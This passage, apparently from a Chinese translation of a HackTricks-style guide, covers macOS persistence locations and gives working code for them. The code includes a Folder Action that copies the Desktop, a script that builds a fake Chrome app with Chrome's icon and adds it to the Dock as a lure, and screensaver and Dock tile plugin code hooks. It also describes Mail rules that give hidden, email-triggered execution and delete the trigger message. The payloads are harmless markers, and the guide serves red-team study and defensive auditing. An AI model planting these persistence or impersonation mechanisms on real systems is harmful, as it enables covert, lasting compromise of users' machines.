macOS 26.5.2 测试 Mac 上存在用户级 `Automator` 和 `Services` 目录；`/Library/Automator` 不存在。未创建、关联或执行任何正在使用的工作流程。请使用一次性账户和仅用于写入标记的动作或工作流程，确认特定的加载路径。单独的 [Folder Actions](#folder-actions) 一节会更详细地介绍该事件来源。

### Folder Actions

说明：[https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
说明：[https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但要配置 Folder Actions，必须能够调用带参数的 `osascript`，以联系 **`System Events`**
- TCC 绕过：[🟠](https://emojipedia.org/large-orange-circle)
  - 它具有一些基本的 TCC 权限，例如访问 Desktop、Documents 和 Downloads

#### 位置

- **`/Library/Scripts/Folder Action Scripts`**
  - 需要 root 权限
  - **触发条件**：访问指定文件夹
- **`~/Library/Scripts/Folder Action Scripts`**
  - **触发条件**：访问指定文件夹

#### 描述与利用

Folder Actions 是一种脚本，会在文件夹发生变化时自动触发，例如添加或移除项目；打开或调整文件夹窗口大小等操作也可以触发。这些操作可用于执行各种任务，并可通过 Finder UI 或终端命令等不同方式触发。<sup>[[17]](#references)[[18]](#references)</sup>

设置 Folder Actions 的方式包括：

1. 使用 [Automator](https://support.apple.com/guide/automator/welcome/mac) 创建 Folder Action 工作流程，并将其安装为服务。
2. 通过文件夹上下文菜单中的 Folder Actions Setup 手动关联脚本。
3. 使用 OSAScript 向 `System Events.app` 发送 Apple Event 消息，以编程方式设置 Folder Action。
   - 此方法特别适合将操作嵌入系统，从而实现一定程度的持久化。

以下脚本示例展示了 Folder Action 可以执行的内容：

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

要使上述脚本可供 Folder Actions 使用，请使用以下命令编译：

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

编译脚本后，运行以下脚本来设置 Folder Actions。此脚本会全局启用 Folder Actions，并将之前编译的脚本专门附加到 Desktop 文件夹。

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

使用以下命令运行 setup 脚本：

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- 这是通过 GUI 实现此持久化的方法：

这是将要执行的脚本：

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

使用以下命令编译：`osacompile -l JavaScript -o folder.scpt source.js`

将其移至：

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

然后，打开 `Folder Actions Setup` 应用，选择**要监视的文件夹**，并在你的情况下选择 **`folder.scpt`**（我这里将它命名为 output2.scp）：

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

现在，如果你用 **Finder** 打开该文件夹，脚本就会执行。

此配置以 base64 格式存储在 **plist** 文件 `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist` 中。

现在，让我们尝试在没有 GUI 访问权限的情况下设置此持久化：

1. **将 `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist` 复制**到 `/tmp` 进行备份：
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **移除**你刚刚设置的 Folder Actions：

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

现在我们有了一个空环境。

3. 复制备份文件：`cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. 打开 Folder Actions Setup.app 以读取此配置：`open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> 这对我来说并没有生效，但这就是 writeup 中的说明 :(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但你需要在系统内安装一个恶意应用
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
  - **触发条件**：用户点击 Dock 中的应用时

#### Description & Exploitation

Dock 中显示的所有应用都在 plist 文件 **`~/Library/Preferences/com.apple.dock.plist`** 中指定<sup>[[19]](#references)</sup>

可以通过以下方式**添加一个应用**：

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

利用一些**社会工程学**手段，你可以在 Dock 中冒充例如 Google Chrome，并实际执行自己的脚本：

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### 输入法

- **写入目标：** 安装在 `~/Library/Input Methods/`（用户级）或 `/Library/Input Methods/`（管理员级）的、包含代码的输入法 app bundle。这与 Apple 的纯文本 `.inputplugin` 键盘映射文件不同，后者本身不是任意代码 payload。
- **触发条件：** 用户在 **系统设置 → 键盘 → 文本输入** 中添加/启用输入源，然后选择或使用它。仅将 bundle 复制到该目录，并不能证明 macOS 会启动它。[Apple 当前的输入源指南](https://support.apple.com/guide/mac-help/mchl84525d76/mac)介绍了如何启用和切换输入源；[Apple 的 InputMethodKit 文档](https://developer.apple.com/documentation/inputmethodkit)介绍了包含代码的输入法。
- **执行身份和限制：** 该方法以已登录用户的身份运行，并受输入法注册、代码签名和当前 macOS 安全检查的限制。对于现有已启用且可写的输入法，需要单独检查其路径和签名。

Apple 较早的[第三方输入法说明](https://developer.apple.com/library/archive/qa/qa1810/_index.html)已经警告，将某些调色板方法复制到这些目录中，甚至不会让它们显示在输入源中。在 macOS 26.5.2 研究用 Mac 上，用户目录存在，但没有安装或激活任何 bundle，因此这属于有文档记载的条件性路径，并非本机运行结果。

### 颜色选取器

说明：[https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
  - 需要发生一个非常具体的操作
  - 最终会进入另一个 sandbox
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- `/Library/ColorPickers`
  - 需要 root 权限
  - 触发条件：使用颜色选取器
- `~/Library/ColorPickers`
  - 触发条件：使用颜色选取器

#### 描述与利用

**编译一个颜色选取器** bundle，将你的代码加入其中（例如可以使用[**这个**](https://github.com/viktorstrate/color-picker-plus)），并添加一个构造函数（如 [Screen Saver 部分](macos-auto-start-locations.md#screen-saver)所示），然后将 bundle 复制到 `~/Library/ColorPickers`。<sup>[[20]](#references)</sup>

之后，触发颜色选取器时，你的 bundle 也应该会执行。

这取决于兼容的 app 是否打开系统颜色面板并选择已安装的选取器。[Apple 的颜色面板指南](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html)介绍了旧版 bundle 的位置。本机路径检查发现了旧版颜色选取器 XPC 服务，但研究用 Mac 上没有安装或加载选取器；不能仅凭路径就推断存在 TCC bypass。

请注意，加载你的 library 的二进制文件处于**限制非常严格的 sandbox**中：`/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync 插件

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- 可用于绕过 sandbox：**否，因为需要执行自己的应用**
- TCC bypass：取决于已启用扩展的 sandbox 和权限；尚未确认存在通用 bypass。

#### 位置

- 特定应用

#### 描述与利用

一个包含 Finder Sync Extension 的应用示例[**见此处**](https://github.com/D00MFist/InSync)。

应用可以包含 `Finder Sync Extensions`。此扩展将置于一个即将执行的应用中。此外，要让扩展能够执行其代码，**必须使用**有效的 Apple 开发者证书**签名**，必须处于**sandbox**环境中（但可以添加较宽松的例外），并且必须使用类似以下的命令进行注册：<sup>[[21]](#references)[[22]](#references)</sup>

已安装的扩展还需要**启用**，并针对相关的 Finder 位置或项目调用；仅写入一个任意的 `.appex` bundle 并不足够。[Apple 的 Finder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) 可获取启用状态。下面的 `pluginkit` 命令展示了显式注册和启用，而非仅通过文件实现自动启动。本文档经过审查；研究用 Mac 上未安装或启用任何新扩展。

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### 屏幕保护程序

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
  - 但最终会进入常见的 application sandbox
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- `/System/Library/Screen Savers`
  - 需要 Root 权限
  - **触发方式**：选择该屏幕保护程序
- `/Library/Screen Savers`
  - 需要 Root 权限
  - **触发方式**：选择该屏幕保护程序
- `~/Library/Screen Savers`
  - **触发方式**：选择该屏幕保护程序

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 说明与利用

在 Xcode 中创建一个新项目，并选择模板来生成新的 **屏幕保护程序**。然后将你的代码添加进去，例如添加以下代码来生成日志。<sup>[[23]](#references)[[24]](#references)</sup>

**Build** 后，将 `.saver` bundle 复制到 **`~/Library/Screen Savers`**。然后打开屏幕保护程序 GUI，只需点击它，就应该会生成大量日志：

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> 请注意，由于加载此代码的二进制文件（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）的 entitlements 中包含 **`com.apple.security.app-sandbox`**，因此你会处于**通用应用沙箱**内。

屏保代码：

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- 可用于 bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - 但最终会处于应用程序 sandbox 中
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - sandbox 看起来限制很多

#### 位置

- `~/Library/Spotlight/`
  - **触发条件**：创建由 Spotlight 插件管理扩展名的新文件。
- `/Library/Spotlight/`
  - **触发条件**：创建由 Spotlight 插件管理扩展名的新文件。
  - 需要 Root 权限
- `/System/Library/Spotlight/`
  - **触发条件**：创建由 Spotlight 插件管理扩展名的新文件。
  - 需要 Root 权限
- `Some.app/Contents/Library/Spotlight/`
  - **触发条件**：创建由 Spotlight 插件管理扩展名的新文件。
  - 需要新应用

#### 描述与利用

Spotlight 是 macOS 内置的搜索功能，旨在让用户**快速、全面地访问计算机上的数据**。\
为了实现快速搜索，Spotlight 会维护一个**专有数据库**，并通过**解析大多数文件**创建索引，从而快速搜索文件名及其内容。<sup>[[25]](#references)</sup>

Spotlight 的底层机制涉及一个名为“mds”的中央进程，即**“metadata server”（元数据服务器）**。该进程负责协调整个 Spotlight 服务。此外，还有多个“mdworker”守护进程执行各种维护任务，例如为不同文件类型建立索引（`ps -ef | grep mdworker`）。这些任务由 Spotlight importer 插件（即**“.mdimporter bundles”**）实现，使 Spotlight 能够理解并索引各种文件格式的内容。

这些插件或 **`.mdimporter`** bundles 位于前面提到的位置。系统必须发现新的 bundle，并确认其匹配某种文件类型；Spotlight 还必须实际索引一个匹配的文件。仅复制 bundle 并不能证明它已加载。[Apple 的 MDImporter 参考文档](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter)指出，加载与符合条件的已更改文件有关。此处未测试 macOS 26 上 Spotlight importer 的执行情况。

可以通过以下命令**查找所有已加载的 `mdimporters`**：

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

例如，**/Library/Spotlight/iBooksAuthor.mdimporter** 用于解析此类文件（扩展名包括 `.iba` 和 `.book`）：

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> 如果检查其他 `mdimporter` 的 Plist，可能找不到 **`UTTypeConformsTo`** 条目。这是因为它是内置的 _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier))，不需要指定扩展名。
>
> 此外，系统默认插件始终优先，因此攻击者只能访问未被 Apple 自带 `mdimporters` 索引的文件。

要创建自己的 importer，可以从这个项目开始：[https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer)，然后修改名称和 **`CFBundleDocumentTypes`**，并添加 **`UTImportedTypeDeclarations`**，使其支持你希望支持的扩展名，并在 **`schema.xml`** 中反映这些更改。\
然后**修改**函数 **`GetMetadataForFile`** 的代码，使其在创建具有已处理扩展名的文件时执行你的 payload。

最后，**构建新的 `.mdimporter` 并将其复制**到前面提到的三个位置之一。你可以通过**监控日志**或运行 **`mdimport -L`** 来检查它是否已加载。

> [!TIP]
> 尽管 importer sandbox 限制非常严格，`mdworker` 仍会以**特权读取权限**为文件编制索引。因此，恶意 `.mdimporter` 可以读取 TCC 保护位置（Downloads、Pictures、Desktop 等）中文件的*内容*，并在无需任何 TCC 提示的情况下外传收集到的 metadata——这就是 **“Sploitlight” TCC bypass (CVE-2025-31199)**，已在 macOS Sequoia 15.4 中修复。<sup>[[55]](#references)</sup>

### ~~Preference Pane~~

> [!CAUTION]
> 看起来这已经不起作用了。

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- 有助于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
  - 需要用户执行特定操作
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

看起来这已经不起作用了。<sup>[[26]](#references)</sup>

### Application Script Files

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- 有助于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但需要安装目标应用，并由受害者运行或使用
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### Location

由已安装的应用或工具实际执行、且行为者可以修改的**解释型脚本**。请确认文件权限和调用路径；仅发现 `.sh` 或 `.py` 文件并不足够。Apple 的 [code-signing guide](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) 指出，已签名的 app bundle 会封存资源，包括脚本。编辑 bundle 内的脚本会破坏该封印，并可能在验证 bundle 时被检测到或阻止。Homebrew launcher 这类外部脚本的签名和信任行为则有所不同。Writeup 中的历史示例包括：

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – 旧版 Sublime Text 使用的脚本；需检查已安装版本中是否存在该文件，以及启动时是否会使用它。测试用 Mac 上没有此文件。
- **`/opt/homebrew/bin/brew`**（Apple Silicon）或 **`/usr/local/bin/brew`**（Intel）– 调用对应 `brew` 路径时执行的 Bash launcher，前提是已安装且行为者有写入权限。测试用 Mac 上的 `/opt/homebrew/bin/brew` 是可写的 Bash 脚本；这是本地观察结果，并非适用于所有 Homebrew 安装的权限规则。
- Python app bundle 中 IDLE 的 `idlemain.py` – 写入可能需要 admin 权限，但运行时使用 IDLE 用户的身份。
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – 当安装了相应的 `org.wireshark.ChmodBPF` launchd job 时，会以 root 身份运行的历史 shell 脚本。测试用 Mac 上没有此脚本和 job。

#### Description & Exploitation

某些工具和应用会在运行时执行解释型脚本。如果签名验证、quarantine 和其他检查允许，可写脚本便能在其特定调用者下次运行时执行新增命令。原始研究展示了 2019 年的若干安装情况；请在目标版本上重新检查这些路径和触发条件。<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

这项复制测试在 macOS 26.5.2 上显示 `marker fired: True`；原始 launcher 未受影响。这证明插入点会在副本中执行，但不能证明经过修改的已签名 app bundle 或真实的 Homebrew 安装能够通过所有启动检查。

### Dock Tile Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
  - 需要声明该 plug-in 的 app 被发现/注册，并由 Dock 处理
  - 该 plugin 会加载到一个**由 Apple 签名**、没有 app-sandbox entitlement 且**禁用了 library validation** 的 helper 中。在所引用的研究中，此 helper 未显示在 Background Task Management UI 中；应检查目标版本上的可见性。
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**，在 app 的 `Info.plist` 中通过 **`NSDockTilePlugIn`** 键引用；plugin 自身的 `Info.plist` 设置 **`NSPrincipalClass`**。

#### 描述与利用

当 app 声明 `NSDockTilePlugIn` 时，Dock 可以在登录时或添加其 tile 时，将所引用的 bundle 加载到 **`com.apple.dock.external.extra`** XPC helper（Apple Silicon 上为 `...extra.arm64`）；app 本身无需启动。这要求该 app 被 macOS 发现/注册并接受。该 helper **由 Apple 签名**，没有 `com.apple.security.app-sandbox` entitlement，并且设置了 `com.apple.security.cs.disable-library-validation`。加载时会调用 principal class 的 **`setDockTile:`** 方法；之后，它可以订阅分布式通知（例如 `com.apple.screenIsLocked`），以接收后续事件。<sup>[[38]](#references)</sup>

在 macOS 26.5.2 上，通过只读 `codesign` 检查确认了该 helper 的 Apple 签名和 entitlements，并发现数个已安装的 app 声明了 `NSDockTilePlugIn`。这台 Mac 上没有安装或加载新的 plug-in，因此在该版本上执行新编写的 bundle 仍未经测试。

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets（Notification Center / WidgetKit）

Writeup：[https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - Widget extension 在**自己的进程**中运行，添加它不会触发 Background Task Management 警告
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)
  - config plist 位于受 TCC 保护的容器中，因此从外部编辑需要 Full Disk Access 或 TCC bypass

#### 位置

- Widget extension bundle：**`<App>.app/Contents/PlugIns/<Widget>.appex`**
- 已启用/已注册的 widgets：**`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`**（键 `widgets.instances` 和 `widgets.widgets`）

#### 描述与利用

应用内置的 WidgetKit extension 在由 Notification Center 管理的**独立进程**中运行。在 `widgets.instances` 中注册一个实例（包含嵌入式 `INIntent` 数据、经 base64 编码的 `NSKeyedArchiver` `CHSWidget` blob），然后重启 NotificationCenter，即可让 widget 加载并执行其 `TimelineProvider`/intent 代码。<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app 规则（运行 AppleScript）

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但 Mail.app 必须已配置账户并正在运行；触发条件是收到一封邮件
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)
  - 在 Mail 外部编辑规则/脚本可能需要先关闭 Mail；在较新的 macOS 上还需要 Full Disk Access

#### 位置

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`**（本地规则；Sonoma/Sequoia 使用 `V10`，更新版本使用 `V11`+）
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`**（iCloud 同步的规则，优先级更高）
- 规则启用状态：**`RulesActiveState.plist`**；AppleScript payload：**`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### 说明与利用

Apple Mail 的**规则**可以设置 *“Run AppleScript”* 操作。通过添加一条匹配精心构造的**主题行**并运行攻击者脚本的规则，攻击者便能在 Mail 的上下文中获得**可远程触发、隐蔽**的代码执行：每当收到特定邮件时就会触发——由于不会创建 LaunchAgent/Login Item，这种方式可以绕过许多持久化扫描器。<sup>[[42]](#references)</sup> 如果将规则设置为同时**删除**触发邮件，就能隐藏证据。防御者可以直接搜索该规则：<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### 配置描述文件 (.mobileconfig)

Writeup：[https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- 可用于绕过 sandbox：[🔴](https://emojipedia.org/large-red-circle)
  - 现代 macOS 需要在“系统设置”→*设备管理*中由**用户手动批准**（在 MDM 之外，静默 `profiles install` 已不可用）
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- 已安装的描述文件位于 **`/Library/Managed Preferences/`** 和 **`/var/db/ConfigurationProfiles/`**；描述文件是一个包含 `PayloadContent` 数组的 XML plist。

#### 说明与利用

`.mobileconfig` 不是直接的代码执行原语，但它可以持久化配置，例如**受信任的根 CA**（`com.apple.security.root`）、**全局或 PAC proxy**（`com.apple.proxy.*`）、**受管理的偏好设置**（`com.apple.ManagedClient.preferences`）或限制。在 macOS 10.15 及更高版本中，Apple 的 [`PayloadRemovalDisallowed` 定义](https://developer.apple.com/documentation/devicemanagement/toplevel)说明：对于**手动安装**且不含移除密码 payload 的描述文件，将其设为 `true` 后，移除时需要**管理员身份验证**；这并不意味着该描述文件绝对无法移除。通过 MDM 安装的描述文件有独立的管理和移除规则。<sup>[[44]](#references)</sup>

> [!WARNING]
> 普通配置描述文件**没有可以投放任意 `LaunchDaemon`/`LaunchAgent` 的 payload 类型**。以这种方式安装 daemon 需要完整的 **MDM enrollment**，以及 management agent/script——不要将 `.mobileconfig` 视为 launchd 投放机制。

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Persistence

